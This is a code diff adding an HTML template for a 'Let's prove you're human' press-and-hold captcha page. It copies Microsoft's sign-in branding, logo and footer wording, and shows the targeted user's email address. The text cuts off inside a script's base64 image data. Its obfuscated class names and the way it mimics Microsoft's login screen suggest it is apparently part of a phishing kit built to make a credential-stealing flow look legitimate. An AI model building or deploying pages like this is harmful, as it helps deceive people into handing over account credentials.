@@ -1,0 +1,1023 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 23 23'%3E%3Cpath fill='%23f35325' d='M0 0h11v11H0z'/%3E%3Cpath fill='%2381bc06' d='M12 0h11v11H12z'/%3E%3Cpath fill='%2305a6f0' d='M0 12h11v11H0z'/%3E%3Cpath fill='%23ffba08' d='M12 12h11v11H12z'/%3E%3C/svg%3E">
+    <title>Let's prove you're human</title>
+    
+    <style>
+
+:root {
+            --colorNeutralBackground1: #292929;
+            --colorNeutralStroke2: #525252;
+            --borderRadiusCircular: 10000px;
+            --fontFamilyBase: "Segoe UI", sans-serif;
+            --colorNeutralForeground3: #adadad;
+
+    /* Dynamic theme mapping variables */
+    --canvasBg: #292929;
+    --containerBg: #292929;
+    --textColor: #ffffff;
+    --subTextColor: #d6d6d6;
+        }
+
+html, body {
+    margin: 0;
+    padding: 0;
+    width: 100%;
+    min-height: 100vh; /* Use min-height, not height */
+    overflow-y: auto;  /* Allow content to push if it exceeds screen */
+    overflow-x: hidden;
+
+    background-size: cover;
+    background-position: center;
+    background-attachment: fixed;
+}
+
+       /* Add this inside your <style> block */
+.bg-img {
+    display: block !important; /* Force it to show */
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100vw !important;  /* Force width to match the full screen width instantly */
+    height: 100vh !important; /* Force height to match the full screen height instantly */
+    object-fit: cover !important; /* Forces the image to always fill the entire height/width seamlessly */
+    transform: translateZ(0);   /* Replaces 'cover' so it doesn't recalculate proportions on load */
+    z-index: -100 !important; /* Put it behind everything */
+}
+
+.page-wrapper {
+    display: flex;
+    flex-direction: column;
+    height: 100vh;      /* Use height, not min-height, to lock the screen */
+    width: 100%;
+    position: relative; /* Essential for absolute positioning of the footer */
+    overflow: hidden;   /* Ensures nothing causes a scrollbar */
+     /* ADD THIS LINE HERE */
+    
+}
+        
+#signInContainer {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    position: relative;
+    top: -30px;
+    left: auto;
+    transform: none;
+    width: 440px;
+    margin: auto;
+    
+    /* Updated padding: 40px top/sides, 80px bottom for extra space */
+    padding: 40px 40px 60px 40px;
+    
+    box-sizing: border-box;
+    background-color: #292929 !important;
+    border-radius: 12px;
+    box-shadow: 0 8px 16px rgba(0,0,0,0.28);
+    z-index: 10;
+     opacity: 1 !important; /* Keep its base style solid */
+}
+/* Animate the inner contents purely without modifying the parent bounds */
+.animation-fade-layer {
+    opacity: 0;
+    animation: simpleFadeIn 0.7s ease-in-out forwards;
+}
+
+@keyframes simpleFadeIn {
+    0% {
+        opacity: 0;
+    }
+    100% {
+        opacity: 1;
+    }
+}
+
+        
+
+/* 3. New Footer Style */
+.page-footer {
+    position: static;
+    bottom: 15px;       /* This pins it exactly 30px from the bottom edge */
+    left: 0;
+    width: 100%;
+    text-align: center;
+    color: var(--colorNeutralForeground3);
+    font-family: var(--fontFamilyBase);
+    font-size: 12px;
+    z-index: 5;  
+    flex-shrink: 0;       /* Keeps it above the background */
+}
+
+.footer-links {
+    display: flex;
+    justify-content: center;
+    flex-wrap: wrap;
+    /* Replacing the variable with a fixed value to ensure it's spacious */
+    gap: 8px; 
+    margin-bottom: 1px; /* Adds space between links and the notice text */
+}
+
+.footer-links a {
+    color: #D6D6D6 !important;
+    text-decoration: none;
+    font-weight: 400; /* Makes the font bold/weighty */
+    /* Adds internal padding to make each link easier to see and click */
+    padding: 4px 8px; 
+    white-space: nowrap; /* Prevents the links from breaking onto two lines */
+}
+
+.footer-links a:hover {
+    text-decoration: underline;
+    color: #ffffff; /* Brighter color on hover looks better on dark themes */
+}
+
+.footer-notice {
+    /* 1. Force explicit px values as a fallback */
+    font-size: 10px !important;
+    line-height: 15px !important;
+    font-weight: 400 !important;
+    
+    /* 2. Keep these for consistency */
+    font-family: "Segoe UI", sans-serif !important;
+    color: #D6D6D6 !important;
+    
+    /* 3. Layout */
+    display: flex;
+    justify-content: center;
+    width: 100%;
+    margin-top: 1px; /* Using explicit px for reliability */
+    text-align: center;
+}
+
+.footer-notice a {
+    color: #479ef5 !important;
+    text-decoration: none !important;
+    font-weight: 600 !important; /* Makes it stand out slightly */
+    font-size: 10px !important;  /* Ensures it stays small */
+    margin-left: 4px;     
+    cursor: pointer;       /* Adds a tiny gap before "Learn more" */
+}
+
+.footer-notice a:hover {
+    color: #62abf5 !important; /* A slightly lighter blue for hover */
+    text-decoration: underline !important;
+}
+
+/* For Desktop */
+@media (min-width: 520px) {
+    .page-footer {
+        position: absolute;
+        bottom: 15px;
+        left: 0;
+    }
+}
+
+/* Mobile Responsive Override */
+@media (max-width: 519px) {
+    html, body {
+        height: 100% !important;
+        width: 100% !important;
+        overflow: hidden !important; 
+    }
+
+    .page-wrapper {
+        height: 100% !important;
+        width: 100% !important;
+        overflow: hidden !important;
+        justify-content: flex-start !important;
+        /* ADD THIS EXACT LINE */
+        background-color: var(--containerBg) !important; 
+    }
+    
+    #signInContainer {
+        position: relative;
+        top: 0;
+        left: 0;
+        transform: none;
+        width: 100vw !important;
+        min-height: 100vh;
+        border-radius: 0 !important;
+        box-shadow: none !important;
+        justify-content: flex-start;
+        box-sizing: border-box;
+        display: flex;
+        flex-direction: column;
+        overflow-y: hidden;
+        
+        /* Updated padding: 40px top, 40px sides, 80px bottom */
+        padding: 25px 40px 80px 40px !important;
+    }
+    
+    .page-footer {
+        position: fixed; /* Fixes it to the screen bottom */
+        bottom: 25px;
+        left: 16px;
+        right: 16px;
+        background-color: #292929; /* Ensure background is solid so text behind it doesn't show */
+        padding-bottom: 0; 
+        z-index: 100;
+        aling-items: center;
+        text-align: center;
+        display: flex;
+        flex-direction: column; 
+        box-sizing: border-box; 
+        flex-wrap: wrap;       /* Allows links to drop to a new line if they run out of space */
+        justify-content: center;
+        width: auto;
+        
+    }
+
+    
+}
+
+
+        .logo { 
+    width: 114px; 
+    height: 24px; 
+    margin-bottom: 24px; /* Slightly more space between logo and email */
+    display: block; 
+    margin-left: auto;
+    margin-right: auto; /* Ensures it stays centered */
+}
+
+        .email-pill {
+            display: inline-flex;
+            align-items: center;
+            border: 1px solid var(--colorNeutralStroke2);
+            border-radius: var(--borderRadiusCircular);
+            padding: 0 8px;
+            height: 30px;
+            margin-top: 8px;
+            margin-bottom: 7px;
+        }
+
+        #bannerText { font-family: var(--fontFamilyBase); color: var(--colorNeutralForeground3); font-size: 12px; font-weight: 600; }
+
+     h2 {
+    /* Font settings */
+    font-family: "Segoe UI", "Segoe UI Web (West European)", -apple-system, BlinkMacSystemFont, Roboto, "Helvetica Neue", sans-serif !important;
+    font-weight: 600 !important; 
+    font-size: 24px !important;
+    line-height: 32px !important;
+    color: #ffffff !important;
+    letter-spacing: -0.2px !important;
+    
+    /* Layout */
+    display: block !important;
+    width: 100% !important;
+    text-align: center !important;
+    
+    /* THE FIX: 
+       margin: 10px auto 20px auto; 
+       Top is 10px, Right is auto, Bottom is 20px, Left is auto.
+    */
+    margin: 5px auto 20px auto !important; 
+    
+    box-sizing: border-box !important;
+    -webkit-font-smoothing: antialiased !important;
+    -moz-osx-font-smoothing: grayscale !important;
+}
+
+/* 1. Ensure the container doesn't have a background or border */
+.captcha-box {
+    background: transparent;
+    border: none;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    padding: 0;
+    margin-top: -10px; /* Adjust this negative value to pull it up as much as you want */
+    margin-bottom: 10px; /* Removes spacing between image and box edge */
+}
+
+/* 2. Ensure the image itself doesn't have borders or shadows */
+.captcha-box img {
+    border: none;
+    outline: none;
+    display: block; /* Removes the tiny space underneath the image */
+    max-width: 100%;
+}
+    .instruction {
+    /* Font settings */
+    font-family: "Segoe UI", sans-serif !important; /* Forces the font */
+    font-size: 14px !important; /* Or var(--fontSizeBase300) */
+    
+    /* Color settings */
+    color: #d6d6d6 !important; /* This matches your --colorNeutralForeground2 */
+    
+    /* Layout */
+    text-align: center;
+    margin: 8px 0 14px 0;
+}
+/* Container: Prevent items from wrapping and force them to stay in a row */
+.captcha-wrapper {
+    display: flex;
+    align-items: center;
+    justify-content: flex-start;
+    gap: 8px;
+    margin-top: 20px;
+    flex-wrap: nowrap; /* Ensures they stay on one line */
+}
+
+/* Icon: Fixed size, no shrinking */
+.fixed-icon, .button-icon {
+    width: 40px;
+    height: 40px;
+    flex-shrink: 0; /* Keeps the circle perfect */
+}
+.icon-action-button {
+    background: transparent !important; /* Removes the white/gray background square */
+    border: none !important;            /* Removes the default button border outline */
+    padding: 0 !important;             /* Removes internal spacing shifting the icon */
+    margin: 0 !important;              /* Removes default outer margins */
+    cursor: pointer !important;        /* Makes it show a clickable pointer hand on hover */
+    display: inline-flex !important;   /* Keeps the layout aligned cleanly with the pill button */
+    outline: none !important;          /* Removes default focus boxes */
+    flex-shrink: 0 !important;         /* Keeps the button structural size stable */
+    transition: opacity 0.15s ease-in-out !important; /* Prepares it for the smooth faint transition */
+}
+/* Keeps the icon permanently faint after it has been clicked */
+.icon-action-button.faint-icon {
+    opacity: 0.2 !important;
+    cursor: default !important;
+    pointer-events: none !important; /* Disables all further hover effects or clicks */
+}
+        
+
+.icon-action-button:hover {
+    opacity: 0.8 !important;
+}
+/* This makes the icon look faint when you press and hold it */
+.icon-action-button:active {
+    opacity: 0.2 !important;
+}
+
+/* The Pill Button: Prevent shrinking */
+.pill-button {
+    display:inline-flex;
+    align-items: center;          /* Explicitly centers child text vertically */
+    justify-content: center; 
+    height: 40px; 
+    padding: 0 55px; 
+    border: 1px solid #0078d4; 
+    border-radius: 50px;
+    cursor: pointer;
+    background-color: white;
+    user-select: none;
+    -webkit-tap-highlight-color: transparent;
+    box-sizing: border-box; 
+    transition: background-color 0.2s;
+    outline: 0 !important;
+    flex-shrink: 0; /* Prevents the pill from squishing */
+    position: relative;
+    overflow: hidden;
+    width: 232px !important;
+}
+
+/* Text styles: Prevent text from forcing the pill to swell */
+.ZpICXubljzwSSUY {
+    display: inline-block;
+    vertical-align: middle;
+    text-align: center;
+    text-transform: none;
+    margin: 0;
+    padding: 0;
+    white-space: nowrap; /* Forces text to stay on one line */
+    font-family: 'Segoe UI', sans-serif; /* Fixed font syntax */
+    font-size: 15px !important;
+    color: #0f6cbd;
+    font-weight: 600;
+    cursor: pointer;
+    user-select: none;
+}
+/* Force your text layer to stay floating on top of the blue fill */
+.pill-button > .ZpICXubljzwSSUY {
+    position: relative !important;
+    z-index: 2 !important;
+    pointer-events: none !important; /* Clicks go straight through to the button */
+}
+
+/* When the button is being held down, change the text color to a lighter grayish blue */
+.pill-button.pressed > .ZpICXubljzwSSUY {
+    color: #D3D3D3 !important;
+}
+/* The blue progress fill layer */
+.pill-button .progress-fill {
+    position: absolute !important;
+    top: 0 !important;
+    left: 0 !important;
+    height: 100% !important;
+    width: 0%;                  /* Managed strictly by JavaScript */
+    background-color: #0f6cbd;  /* The exact blue color */
+    z-index: 2 !important;      /* Sits behind text, above button background */
+    pointer-events: none !important;
+    transition: width 0.1s linear; /* Smooth fill motion */
+    overflow: hidden;
+}
+
+/* 2. ADD JUST THIS SPECIFIC LAYER CHAIN RIGHT BELOW IT */
+.pill-button .progress-fill .ZpICXubljzwSSUY {
+    position: absolute !important;
+    top: 0 !important;
+    left: 0 !important;
+    width: 232px !important;       /* Matches the inner width of your pill button cleanly */
+    height: 100% !important;
+    box-sizing: border-box !important;
+    display: flex !important;      /* Changed from table-cell to clean flex */
+    align-items: center !important;/* Forces pixel-perfect vertical centering */
+    justify-content: center !important; /* Centers the text horizontally */
+    padding: 0 !important;         /* Removes the 8px padding that was shifting it up */
+}
+
+/* Container to hide and perfectly center the dots inside the button */
+/* Container to hide and perfectly center the dots inside the button */
+.pill-button .loading-dots {
+    position: absolute !important;
+    top: 50% !important;
+    left: 50% !important;
+    transform: translate(-50%, -50%) !important;
+    z-index: 3 !important;
+    display: none; /* Controlled by JavaScript flex switch */
+    gap: 5px;      /* Clear spacing between dots */
+
+     
+    
+}
+/* New helper layout block to center inline items vertically inside an absolute layer */
+
+
+/* Style each individual dot into a small, perfectly round circle */
+.pill-button .loading-dots .dot {
+    width: 12px;
+    height: 11px;
+    background-color: #ffffff; /* Kept exactly black */
+     border-radius: 6px / 8px;       /* Keeps the top and bottom edges perfectly rounded */
+    
+    opacity: 0.3;
+    animation: dotFade 1.2s infinite ease-in-out both;
+}
+
+/* Create the smooth sequential step across the three dots */
+.pill-button .loading-dots .dot:nth-child(1) {
+    animation-delay: 0s;
+}
+.pill-button .loading-dots .dot:nth-child(2) {
+    animation-delay: 0.2s;
+}
+.pill-button .loading-dots .dot:nth-child(3) {
+    animation-delay: 0.4s;
+}
+
+/* The clean fade animation loop (No bouncing, no scaling) */
+@keyframes dotFade {
+    0%, 100% {
+        opacity: 0.3; /* Faded state */
+    }
+    50% {
+        opacity: 1;   /* Fully illuminated white state */
+    }
+}
+/* Container to hide and perfectly center the checkmark inside the button */
+.pill-button .success-checkmark {
+    position: absolute !important;
+    top: 50% !important;
+    left: 50% !important;
+    transform: translate(-50%, -50%) !important;
+    z-index: 3 !important;
+    display: none; /* Controlled by JavaScript display switches */
+    width: 20px;   /* Clean, visible size matching the layout */
+    height: 20px;
+}
+
+.pill-button .success-checkmark svg {
+    width: 100%;
+    height: 100%;
+    display: block;
+}
+
+/* Select the actual line inside the SVG to apply the drawing animation */
+.pill-button .success-checkmark svg polyline {
+    stroke-dasharray: 50;  /* Sets the length of the dash line loop */
+    stroke-dashoffset: -50; /* Squeezes the line out of view initially */
+    
+    /* When JavaScript sets the container to display: block, this animation triggers */
+    animation: drawCheckmark 0.5s ease-in-out forwards, fadeOutCheckmark 0.4s ease-in-out 1.8s forwards;
+}
+
+/* The keyframe animation that creates the literal drawing motion */
+@keyframes drawCheckmark {
+    to {
+        stroke-dashoffset: 0; /* Smoothly rolls the line into view */
+    }
+}
+
+/* 2. Smooth fade out right before the loading dots arrive */
+@keyframes fadeOutCheckmark {
+    to {
+        opacity: 0;
+        transform: scale(0.8); /* Gives a slight shrinking effect as it drops away */
+    }
+}
+
+        
+
+/* Clean Light Theme Overrides */
+body.light-theme {
+    --colorNeutralBackground1: #ffffff;
+    --colorNeutralForeground3: #666666;
+    background-color: #ffffff !important;
+    --colorNeutralStroke2: #e0e0e0; 
+
+    /* ADD THESE THEME VARIABLE DEFINITIONS HERE */
+    --canvasBg: #ffffff;
+    --containerBg: #ffffff; 
+    --textColor: #000000;
+    --subTextColor: #505050;
+}
+
+/* Allow the background SVG asset to show through the layout layers on desktop, */
+/* but keep it solid white on mobile to mask layout flashing on reload */
+body.light-theme .page-wrapper {
+    background-color: var(--containerBg) !important;
+}
+
+@media (min-width: 520px) {
+    body.light-theme .page-wrapper {
+        background-color: transparent !important;
+    }
+}
+
+body.light-theme .page-footer {
+    background-color: transparent !important;
+}
+
+
+/* Force the login container box to be white with sharp contrast text */
+body.light-theme #signInContainer {
+    background-color: #ffffff !important;
+    color: #333333 !important;
+    box-shadow: 0 8px 16px rgba(0, 0, 0, 0.08);
+}
+
+body.light-theme h2 {
+    color: #000000 !important;
+}
+
+body.light-theme .instruction {
+    color: #666666 !important;
+}
+
+body.light-theme .footer-links a,
+body.light-theme .footer-notice {
+    color: #666666 !important;
+}
+
+/* Shifts the Microsoft logo wordmark text color to dark gray for visibility */
+body.light-theme svg[data-testid="microsoftLogo"] path:nth-child(1) {
+    fill: #6b6b6b !important;
+}
+
+
+
+</style>
+</head> 
+<body>
+    
+    
+    <div class="page-wrapper">
+   <div class="animation-fade-layer" style="width: 100%; height: 100%; display: flex; flex-direction: column; align-items: center; justify-content: inherit;">
+    <div id="signInContainer">
+        <svg data-testid="microsoftLogo" class="logo" viewBox="0 0 114 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                 <path d="M47.2997 5.30006V19.7001H44.7997V8.40006H44.7664L40.2997 19.7001H38.633L34.0664 8.40006H34.033V19.7001H31.733V5.30006H35.333L39.4664 15.9667H39.533L43.8997 5.30006H47.2997ZM49.3664 6.40006C49.3664 6.00006 49.4997 5.66673 49.7997 5.40006C50.0997 5.1334 50.433 5.00006 50.833 5.00006C51.2664 5.00006 51.633 5.1334 51.8997 5.4334C52.1664 5.70006 52.333 6.0334 52.333 6.4334C52.333 6.8334 52.1997 7.16673 51.8997 7.4334C51.5997 7.70006 51.2664 7.8334 50.833 7.8334C50.3997 7.8334 50.0664 7.70006 49.7997 7.4334C49.533 7.10006 49.3664 6.76673 49.3664 6.40006ZM52.0664 9.36673V19.7001H49.633V9.36673H52.0664ZM59.433 17.9334C59.7997 17.9334 60.1997 17.8334 60.633 17.6667C61.0664 17.5001 61.4664 17.2667 61.833 17.0001V19.2667C61.433 19.5001 60.9997 19.6667 60.4997 19.7667C59.9997 19.8667 59.4664 19.9334 58.8664 19.9334C57.333 19.9334 56.0997 19.4667 55.1664 18.5001C54.1997 17.5334 53.733 16.3001 53.733 14.8334C53.733 13.1667 54.233 11.8001 55.1997 10.7334C56.1664 9.66673 57.533 9.1334 59.333 9.1334C59.7997 9.1334 60.233 9.20006 60.6997 9.30006C61.1664 9.4334 61.533 9.56673 61.7997 9.70006V12.0334C61.433 11.7667 61.033 11.5334 60.6664 11.4001C60.2664 11.2334 59.8664 11.1667 59.4664 11.1667C58.4997 11.1667 57.733 11.4667 57.133 12.1001C56.533 12.7334 56.233 13.5667 56.233 14.6334C56.233 15.6667 56.4997 16.5001 57.0664 17.0667C57.6997 17.6334 58.4664 17.9334 59.433 17.9334ZM68.733 9.20006C68.933 9.20006 69.0997 9.20006 69.2664 9.2334C69.433 9.26673 69.5664 9.30006 69.6664 9.3334V11.8001C69.533 11.7001 69.3664 11.6334 69.0997 11.5334C68.8664 11.4334 68.5664 11.4001 68.1997 11.4001C67.5997 11.4001 67.0997 11.6667 66.6997 12.1667C66.2997 12.6667 66.0664 13.4334 66.0664 14.5001V19.7001H63.633V9.36673H66.0664V11.0001H66.0997C66.333 10.4334 66.6664 10.0001 67.0997 9.66673C67.5664 9.36673 68.0997 9.20006 68.733 9.20006ZM69.7997 14.7001C69.7997 13.0001 70.2664 11.6334 71.233 10.6334C72.1997 9.6334 73.533 9.1334 75.2664 9.1334C76.8664 9.1334 78.133 9.60006 79.033 10.5667C79.933 11.5334 80.3997 12.8334 80.3997 14.4667C80.3997 16.1334 79.933 17.4667 78.9664 18.4667C77.9997 19.4667 76.6997 19.9667 75.033 19.9667C73.433 19.9667 72.1664 19.5001 71.233 18.5667C70.2664 17.6001 69.7997 16.3001 69.7997 14.7001ZM72.333 14.6001C72.333 15.6667 72.5664 16.5001 73.0664 17.0667C73.5664 17.6334 74.2664 17.9334 75.1664 17.9334C76.0664 17.9334 76.733 17.6334 77.1997 17.0667C77.6664 16.5001 77.8997 15.6667 77.8997 14.5334C77.8997 13.4334 77.6664 12.6001 77.1664 12.0334C76.6997 11.4667 76.033 11.2001 75.1664 11.2001C74.2664 11.2001 73.5997 11.5001 73.0997 12.1001C72.5664 12.6667 72.333 13.5001 72.333 14.6001ZM83.9997 12.1001C83.9997 12.4334 84.0997 12.7334 84.333 12.9334C84.5664 13.1334 85.033 13.3667 85.7997 13.6667C86.7664 14.0667 87.4664 14.5001 87.833 14.9667C88.233 15.4667 88.433 16.0334 88.433 16.7334C88.433 17.7001 88.0664 18.5001 87.2997 19.0667C86.5664 19.6667 85.533 19.9667 84.2664 19.9667C83.833 19.9667 83.3664 19.9001 82.833 19.8001C82.2997 19.7001 81.8664 19.5667 81.4997 19.4001V17.0001C81.933 17.3001 82.433 17.5667 82.933 17.7334C83.433 17.9001 83.8997 18.0001 84.333 18.0001C84.8664 18.0001 85.2997 17.9334 85.533 17.7667C85.7997 17.6001 85.933 17.3667 85.933 17.0001C85.933 16.6667 85.7997 16.3667 85.533 16.1667C85.2664 15.9334 84.733 15.6667 83.9997 15.3667C83.0997 15.0001 82.4664 14.5667 82.0997 14.1001C81.733 13.6334 81.533 13.0334 81.533 12.3001C81.533 11.3667 81.8997 10.6001 82.633 10.0001C83.3664 9.40006 84.333 9.10006 85.4997 9.10006C85.8664 9.10006 86.2664 9.1334 86.6997 9.2334C87.133 9.30006 87.533 9.4334 87.833 9.5334V11.8334C87.4997 11.6334 87.133 11.4334 86.6997 11.2667C86.2664 11.1001 85.833 11.0334 85.433 11.0334C84.9664 11.0334 84.5997 11.1334 84.3664 11.3001C84.133 11.5334 83.9997 11.7667 83.9997 12.1001ZM89.4664 14.7001C89.4664 13.0001 89.933 11.6334 90.8997 10.6334C91.8664 9.6334 93.1997 9.1334 94.933 9.1334C96.533 9.1334 97.7997 9.60006 98.6997 10.5667C99.5997 11.5334 100.066 12.8334 100.066 14.4667C100.066 16.1334 99.5997 17.4667 98.633 18.4667C97.6664 19.4667 96.3664 19.9667 94.6997 19.9667C93.0997 19.9667 91.833 19.5001 90.8997 18.5667C89.9664 17.6001 89.4664 16.3001 89.4664 14.7001ZM91.9997 14.6001C91.9997 15.6667 92.233 16.5001 92.733 17.0667C93.233 17.6334 93.933 17.9334 94.833 17.9334C95.733 17.9334 96.3997 17.6334 96.8664 17.0667C97.333 16.5001 97.5664 15.6667 97.5664 14.5334C97.5664 13.4334 97.333 12.6001 96.833 12.0334C96.3664 11.4667 95.6997 11.2001 94.833 11.2001C93.933 11.2001 93.2664 11.5001 92.7664 12.1001C92.2664 12.6667 91.9997 13.5001 91.9997 14.6001ZM108.133 11.3667H104.5V19.7001H102.033V11.3667H100.3V9.36673H102.033V7.9334C102.033 6.8334 102.4 5.96673 103.1 5.26673C103.8 4.56673 104.7 4.2334 105.8 4.2334C106.1 4.2334 106.366 4.2334 106.6 4.26673C106.833 4.30007 107.033 4.3334 107.2 4.40007V6.50006C107.133 6.46673 106.966 6.40006 106.766 6.3334C106.566 6.26673 106.333 6.2334 106.066 6.2334C105.566 6.2334 105.166 6.40006 104.9 6.70006C104.633 7.0334 104.5 7.50006 104.5 8.10006V9.3334H108.133V7.00006L110.566 6.26673V9.3334H113.033V11.3334H110.566V16.1667C110.566 16.8001 110.666 17.2667 110.9 17.5001C111.133 17.7667 111.5 17.9001 112 17.9001C112.133 17.9001 112.3 17.8667 112.5 17.8001C112.7 17.7334 112.866 17.6667 113.033 17.5667V19.5667C112.866 19.6667 112.633 19.7334 112.266 19.8001C111.9 19.8667 111.566 19.9001 111.2 19.9001C110.166 19.9001 109.4 19.6334 108.9 19.0667C108.4 18.5334 108.133 17.7001 108.133 16.6001V11.3667Z" fill="#FFFFFF"></path><path d="M13.2383 13.2383H24.5V24.5H13.2383V13.2383Z" fill="#FFB900"></path><path d="M0.5 13.2383H11.7617V24.5H0.5V13.2383Z" fill="#00A4EF"></path><path d="M13.2383 0.5H24.5V11.7617H13.2383V0.5Z" fill="#7FBA00"></path><path d="M0.5 0.5H11.7617V11.7617H0.5V0.5Z" fill="#F25022"></path></svg>
+        
+        <% if (displayUser) { %>
+    <div class="email-pill"> 
+        <div id="bannerText"><%= displayUser %></div> 
+    </div>
+<% } %>
+        
+        <h2>Let's prove you're human</h2>
+        <div class="captcha-box">
+    
+        <img id="captcha-img" alt="Captcha" src="">
+    
+</div>
+        <p class="instruction">Press and hold the button.</p>
+     <div class="captcha-wrapper">
+    <button class="icon-action-button" aria-label="Action icon">
+   <svg width="40" height="40" viewBox="5 4 40 40" aria-hidden="true" focusable="false" class="button-icon">
+        <circle cx="25" cy="24" r="20" fill="#707070"></circle>
+        <path fill="white" d="M25 10.07C25.3988 10.0693 25.7939 10.1474 26.1625 10.2998C26.531 10.4521 26.8659 10.6758 27.1479 10.9578C27.4299 11.2399 27.6534 11.5748 27.8056 11.9435C27.9578 12.3121 28.0358 12.7072 28.035 13.106C28.0355 13.5047 27.9574 13.8995 27.805 14.2679C27.6527 14.6363 27.4291 14.971 27.1472 15.2529C26.8652 15.5347 26.5304 15.7582 26.162 15.9104C25.7935 16.0626 25.3987 16.1407 25 16.14C24.6013 16.1407 24.2063 16.0626 23.8378 15.9103C23.4693 15.758 23.1344 15.5345 22.8525 15.2525C22.5705 14.9706 22.347 14.6357 22.1947 14.2672C22.0424 13.8987 21.9643 13.5037 21.965 13.105C21.965 11.48 23.32 10.07 25 10.07ZM21.965 36.575C21.8466 36.8501 21.6496 37.0841 21.3988 37.2477C21.148 37.4114 20.8545 37.4974 20.555 37.495C20.339 37.495 20.122 37.442 19.905 37.333C19.092 36.953 18.767 36.033 19.146 35.22C19.146 35.22 22.127 28.39 22.669 25.897C22.886 25.03 22.995 22.699 23.049 21.615C23.049 21.235 22.832 20.911 22.507 20.802L15.786 18.851C14.919 18.58 14.431 17.659 14.702 16.846C14.972 16.033 15.894 15.653 16.707 15.87C16.707 15.87 22.832 17.821 25 17.821C27.168 17.821 33.401 15.816 33.401 15.816C34.214 15.599 35.136 16.086 35.352 16.9C35.569 17.713 35.082 18.634 34.268 18.85L27.602 20.856C27.276 20.965 27.005 21.29 27.06 21.669C27.114 22.753 27.222 25.084 27.439 25.951C27.981 28.444 30.962 35.274 30.962 35.274C31.342 36.087 30.962 37.008 30.203 37.388C30.002 37.4922 29.7794 37.5477 29.553 37.55C28.957 37.55 28.36 37.225 28.143 36.629L25 30.07L21.965 36.575Z"></path>
+    </svg>
+    </button>
+    
+    <div class="pill-button" tabindex="0" role="button" id="verify-button">
+    <p class="ZpICXubljzwSSUY">Press and hold</p>
+    <p class="please-wait-text" style="color: #D3D3D3 !important; display: none;">Please wait...</p>
+    
+    <div class="progress-fill">
+        <p class="ZpICXubljzwSSUY" style="color: #ffffff !important;">Press and hold</p>
+        <p class="please-wait-text" style="color: #ffffff !important; display: none;">Please wait...</p>
+    </div>
+
+    <div class="loading-dots">
+        <div class="dot"></div>
+        <div class="dot"></div>
+        <div class="dot"></div>
+    </div>
+
+    <div class="success-checkmark">
+    <svg viewBox="0 0 24 24" fill="none" stroke="#ffffff" stroke-width="4" stroke-linecap="round" stroke-linejoin="round">
+        <polyline points="20 6 9 17 4 12"></polyline>
+    </svg>
+</div>
+
+</div>
+</div>    
+</div>
+</div>
+
+ <footer class="page-footer">
+            <div class="footer-links">
+                <a href="#">Help and feedback</a>
+                <a href="#">Terms of Use</a>
+                <a href="#">Privacy and cookies</a>
+            </div>
+            <div class="footer-notice">
+    Use private browsing if this is not your device. 
+    <a href="https://your-link-url.com" target="_blank">Learn more</a>
+</div>
+        </footer>
+
+
+</div>
+
+<script>
+
+    const darkBg = "/images/background_img.svg";
+    const lightBg = "/images/background_img_light.svg";
+    const darkBase64 = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMAAAADACAMAAABlApw1AAADAFBMVEVHcEwNDQwKCgouKysGBgQVFBQvLy9AQEAhGBE2NDUgIiNHR0gWFRQfHR4aGRkgIB1SUVFgYF8iHx9VVldrbGsaGRqCgYgIBgZIQkN1cHl9cHt3dnaDg4iIhoaGh4mGh4lZV1pVVVV5e3mDg4R+cnl3bHGFh4hQKS6DhoeChIOHiImHh4lwRWWIiYgQm5F2dIOFiYldSHA7l8+Kh4c5aTgSbWWExL+JiYkniNHQVzeHjIoKOIPJLyY+HywVVD1csJyJiYqHhohNIx5wEiZYva2IhInOZEuGXGKKiooTY1aHIDAyWV93slwFdQpMOj+LyGIDXQ7nZXdNMYBwDT4rjtEAbDkmXF+JiomVtHuFXFwAM4CQysIfa0cHcwdsra3uVryAwIQ/pNNRmMgULlZMoJfCSD9/aW2dcl94GRhCgkjZmQXLVJR1DyJUpmRxbXjoSuLuUDfpSUrpSlRGreJ00cLteFDsTWFCp+ao3ILobUqd1pA/puHnRzUAcMZKtOQShNSUHSonldqPAwHwUkim5t6E1ryrIhwtnNnvel3pS0HvT1PyWVx21tBgybkDEAIZjtTD5qACenntcGzT8L6x7ecDhnVrzMU4oODtX2zue0Hra1rZOy6e1nvviSm2PjLvZX5Lw7biXFVBm0q12p8EarrvhzWW39vtUozxhkiA28+uIz82vLfaO0NeSoJ9x15SvePpci613pFHvKneYkGgNRPiQFnJMUaT0aTvTHpbsFPUNVoxpYuNz3iv3W36ZmnoRWz1RVs/mzL8pV0GgMNxwGp7yXIHbVyX025OS3+NJlEqgDaKzYx7w1FXwaJGgTLT8K0FKVYOdzs1pdktkFUblHqEzEJ4HAhKohW13rNvy69XwsTTahr/k582ghC/6dWc3smoHGEJrKfvsgQGPYbC54YwsKP9lIKV01nylSSxXgVntShqxeVou34MIzXgP6TDK4MDFDPybck6LmWDTcZhP5Q/tdcAXKa3gPKda+G4Q1l5w5D4ldjSlAA0UGr4iNNcrp6GmXVkAAAAb3RSTlMADAkeBA8aHgEeFh0RGhMCHyEdGSMXEQYaDAgnGiEoLhYcLDMiHUEjNztKVg55/kpjaNxtidHVlNj+iMn/OJOix7BlueKeQLPY4DxMo+Av45Wg/v6v32vyuIiv3rr8cP3ky/2PnIvAun9+lPDKyfHcvXENAAAgAElEQVR42uyZTUxb2RXHX2yDn79tjMEfhNjgbxtBYBQiJqmgUkZRkzCZKlPcCEZJZ9JmFq0YeYFlGNJMpKQNlcZSqxmpsSaSGc0qBbFCluxIVg1UxgIxyIJKdbJBg0Sy7iKrnnPve/ZzgPcMWXTD3/bzB/a553fPx73vwTAnOtGJTnSiE53oRCeSEMuyBlHBF/6f9sQHMygUilZJKRQGtn6D9dir26DEYGBMJpOdkpBMBmMa6jGJFuuxJ0OKd2RgYapwrIaGBq2EGhpg0FYFK22ylRiUttdAZuVdEFhDKxlMq9WrpaXXNiCBQXL6ZWCxPoNaOinHReDHwsEapQXfIgiiBAZism6Den1DPbNyeKjJVKExpVKjUYoI/wpD6mE4sSxi0aZeXZ8